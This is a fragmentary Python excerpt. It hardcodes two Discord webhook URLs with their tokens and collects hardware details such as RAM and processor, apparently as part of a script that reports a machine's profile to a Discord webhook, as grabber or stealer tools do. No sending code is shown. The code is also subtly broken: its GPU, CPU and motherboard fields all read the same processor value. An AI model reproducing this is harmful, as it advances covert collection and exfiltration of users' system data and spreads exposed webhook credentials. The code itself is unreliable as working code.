...
webhook = 'https://discord.com/api/webhooks/1044374085976735805/xaPYjUER99sf4WAaFqhVxxzx3mN29jFElFx7ZEiuIJ1E0B5YQy_uNHE1oP7Ln2yg26mq'

# Get hardware information
ram = (str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB") + " of RAM"
gpu = "Gpu: " + (platform.processor())
cpu = "Cpu: " + (platform.processor())
motherboard = "Motherboard: " + (platform.processor())
...
webhook = "https://discord.com/api/webhooks/1045095313494524024/taryJukQCGZBwwDw7DPk_Cel3YEymX_A1pqLNNfBcK14w43GcQh7AoXI_19uem3b-Sf4"
